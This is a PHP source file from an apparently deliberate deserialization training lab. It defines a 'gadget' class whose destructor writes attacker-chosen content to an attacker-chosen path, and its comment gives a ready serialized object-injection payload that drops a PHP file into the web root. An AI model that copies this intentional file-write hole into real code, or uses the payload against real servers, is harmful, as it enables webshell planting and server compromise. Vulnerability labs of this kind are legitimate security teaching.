<?php

declare(strict_types=1);

/**
 * Object-injection GADGET for the sessions.g12 deserialization lab.
 *
 * When a PrefLogger is unserialize()d from the attacker-controlled bs_prefs
 * cookie (vuln levels only), PHP runs its __destruct() at request shutdown,
 * which writes ->content to ->path. A crafted serialized PrefLogger can thus
 * drop an arbitrary file (e.g. a webshell into the web root) — classic PHP
 * object injection.
 *
 * This class exists ONLY to make the vulnerability demonstrable; nothing in the
 * app legitimately constructs it.
 *
 * Example payload (base64 it into the bs_prefs cookie):
 *   O:9:"PrefLogger":2:{s:4:"path";s:24:"/var/www/html/pwned.php";s:7:"content";s:16:"<?php phpinfo();";}
 */
if (!class_exists('PrefLogger')) {
    class PrefLogger
    {
        public string $path = '';
        public string $content = '';

        public function __destruct()
        {
            // The dangerous sink: writes attacker-controlled content to an
            // attacker-controlled path when the object is destroyed.
            if ($this->path !== '') {
                @file_put_contents($this->path, $this->content);
            }
        }
    }
}
